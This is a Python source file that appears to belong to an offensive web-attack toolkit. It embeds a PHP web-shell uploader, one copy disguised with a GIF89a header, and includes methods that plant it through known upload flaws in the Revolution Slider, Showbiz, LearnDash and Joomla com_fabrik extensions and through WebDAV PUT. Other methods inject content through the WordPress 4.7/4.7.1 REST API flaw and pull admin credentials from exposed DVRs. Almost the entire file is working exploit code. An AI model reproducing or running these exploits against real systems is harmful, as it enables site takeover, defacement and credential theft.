#-*- coding: utf-8 -*-
import requests, re, json
from .core.temp import *

class exploit:
      nf = '407_AEX.php'
      file = """ <?php echo '407_AUTHENTIC_EXPLOIT'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty 7($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done');            </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
      com_fabrik = """GIF89a <?php echo '407_AUTHENTIC_EXPLOIT'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" Joomla="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done');               </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
      cs = [
            '/wp-admin/admin-ajax.php',
            '/wp-content/plugins/revslider/temp/update_extract/',
            '/wp-content/plugins/showbiz/temp/update_extract/',
            '/wp-content/uploads/assignments/',
            '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table='
             ]

      def __init__(cie, target): # Gak Usah Di Colong gan : )
          cie.target = target    # KYU - Esjet - Dildo - kalean - 407Aex - dan elo kang rikod


      def webdav_file_upload(cie, file, name):
          cie.file = file
          cie.name = name
          with requests.Session() as ses:
               hider = {'Content-Type':'application/octet-stream'}
               with open(cie.file, 'rb') as fel:
                    sc = fel.read()
                    wdv = ses.put(cie.target+'/'+cie.name, data=sc, headers=hider)
                    if wdv.status_code == 200:
                       print(green('[*]')+'File Has been Upload')
                       print('\033[92mUrl : \033[0m'+cie.target+'/'+cie.name)
                       print('\n')
                    else:
                       print(red('[-]')+' File Not Uploaded Mybe Not Vulnerability')

      def wordpress_content_injection(cie, content):
          '''
           vulnerability wordpress Version 4.7 or 4.7.1
          '''
          cie.content = content
          with requests.Session() as ses:
               version = ses.get(cie.target).text
               ver = re.findall('ver=(.*)"', version)[0]
               if ver == '4.7' or ver == '4.7.1':
                  print(green('[*]')+' Vulnerability')
                  wp_post = re.findall(r"https://api.w.org/' href='(.*)'", version)[0]
                  dat = ses.get(wp_post+"wp/v2/posts").json()
                  print('Post ID : [{}]\n Title [{}]\n link : {}'.format(dat['id'], dat['title']['rendered'].encode('utf-8'), dat['link']))
                  bob = int(input("[Post-ID] : "))
                  print('\n')
                  ttl = str(input('[Title] : '))
                  hider = {'Content-Type': "application/json; charset=xxxe", 'Accept': "application/json"}
                  data = {'id':str(bob)+" textappendshere", 'title':ttl, 'content':cie.content}
                  frm = "wp/v2/posts/{}/?id={}CBF".format(bob, bob)
                  resp = requests.post(wp_post+frm, data=json.dumps(data), headers=hider)
                  print('---- Success ----')
               else:
                 print(red('[-]')+' Not Vulnerability Wordpress use Version : '+ver)


      @property
      def DVRs_credential_exposed(cie):
          '''
          ( (C)opyright )
           https://www.exploit-db.com/exploits/44577
          [CODENAME] : JaxBCD
          '''
          hider = {'Host':cie.target,
                   'User-Agent':'Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)',
                   'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language':'es-AR,en-US;q=0.7,en;q=0.3',
                   'Connection':'close',
                   'Content-Type':'text/html',
                   'Cookie':'uid=admin'}
          cred = requests.get(cie.target+"/device.rsp?opt=user&cmd=list", headers=hider, timeout=10.000).json()
          user = str(cred['list'][0]['uid'])
          pwd = str(cred['list'][0]['pwd'])
          print(green('[+]')+'Vulnerability')
          print(green('[*]')+'User : '+user)
          print(green('[*]')+'Password : '+pwd)

      @property
      def WP_revslider_file_upload(cie):
          pd = {'action':'revslider_ajax_action','client_action':'update_plugin'}
          files = {'update_file':(exploit.nf, exploit.file, 'text/html')}
          resp = requests.post(cie.target+exploit.cs[0],
                               data=pd, files=files)
          cek = requests.get(cie.target+exploit.cs[1]+exploit.nf).text
          if '407_AUTHENTIC_EXPLOIT' in cek:
              print(green('[+]')+'Upload File Success')
              print('Url : '+cie.target+exploit.cs[1]+exploit.nf)
          else:
              print(red('[-]')+'FAILED ! Target Maybe Not Vulnerability')

      @property
      def WP_showbiz_file_upload(cie):
          pd = {'action':'showbiz_ajax_action','client_action':'update_plugim'}
          files = {'update_file':(exploit.nf,exploit.file, 'text/html')}
          resp = requests.post(cie.target+exploit.cs[0], data=pd, files=files)
          cek  = requests.get(cie.target+exploit.cs[2]+exploit.nf)
          if '407_AUTHENTIC_EXPLOIT' in cek.text:
             print(green('[+]')+'Upload File Success')
             print('Url : '+cie.target+exploit.cs[2]+exploit.nf)
          else:
             print(red('[-]')+'FAILED ! Target Maybe Not Vulnerability')

      @property
      def WP_learn_dash_file_upload(cie):
          data = {'post':'foobar','course_id':'foobar','uploadfile':'foobar'}
          files = {'uploadfiles[]':(exploit.nf, exploit.file, 'text/html')}
          requests.post(cie.target, files=files, data=data)
          cek = requests.get(cie.target+exploit.cs[3]+exploit.nf)
          if '407_AUTHENTIC_EXPLOIT' in cek.text:
              print(green('[+]')+'Upload File Success')
              print('Url : '+cie.target+exploit.cs[3]+exploit.nf)
          else:
              print(red('[-]')+'FAILED ! Target Maybe Not Vulnerability')


      def com_fabrik(cie):
          data = {
                "name": "me.php",
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            }
          fel = {'userfile':(exploit.nf,str(exploit.com_fabrik),'multipart/form-data')}
          requests.post(cie.target+exploit.cs[4],files=fel, data=data)
          cek = requests.get(cie.target+'/media/'+exploit.nf)
          if '407_AUTHENTIC_EXPLOIT' in cek.text:
              print(green('[+]')+'Upload File Success')
              print('Url : '+cie.target+'/media/'+exploit.nf)
          else:
              print(red('[-]')+'FAILED ! Target Maybe Not Vulnerability')


